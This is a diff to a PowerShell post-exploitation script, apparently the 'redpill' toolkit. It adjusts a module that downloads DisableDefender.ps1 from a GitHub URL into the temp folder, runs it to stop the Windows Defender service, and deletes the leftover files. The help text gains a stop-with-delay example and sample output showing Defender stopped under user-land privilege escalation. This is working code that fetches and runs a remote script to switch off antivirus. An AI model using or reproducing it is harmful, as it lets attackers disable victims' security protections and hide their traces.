@@ -2277,7 +2277,7 @@ If($DisableAV -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,3271484375/KB
+      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,7080078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2285,7 +2285,7 @@ If($DisableAV -ne "false"){
    }
 
    ## Run auxiliary module
-   If($Delay -lt 3 -or $Delay -gt 6){$Delay = "4"}
+   If($Delay -lt 4 -or $Delay -gt 10){$Delay = "4"}
    powershell -File "$Env:TMP\DisableDefender.ps1" -Action $DisableAV -ServiceName "$ServiceName" -Delay "$Delay"
 
    ## Clean Artifacts left behind
@@ -4115,10 +4115,13 @@ $HelpParameters = @"
       If DisableDefender its executed without administrator privileges!
 
    .Parameter DisableAV
-      Accepts arguments: Query, Stop and Start (default: Query)
+      Accepts arguments: Query, Stop, Start (default: Query)
 
    .Parameter ServiceName
-      Windows Defender Service Name (default: WinDefend)
+      The Windows Defender Service Name (default: WinDefend)
+
+   .Parameter Delay
+      Time (sec) to update the service state (default: 4)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -DisableAV Query
@@ -4132,14 +4135,19 @@ $HelpParameters = @"
       PS C:\> powershell -File redpill.ps1 -DisableAV Stop
       Stops the Windows Defender Service (WinDefend)
 
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DisableAV Stop -Delay 7
+      Give some time (sec) to update the service state (default: 4)
+
    .OUTPUTS
       Disable Windows Defender Service
       --------------------------------
       ServiceName      : WinDefend
       AMRversion       : 4.18.2104.14
+      ShellPrivs       : UserLand::EOP
       StartType        : Automatic
-      CurrentStatus    : Running
-      CanStop          : True
+      CurrentStatus    : Stopped
+      CanStop          : False
    #>!bye..
 
 "@;
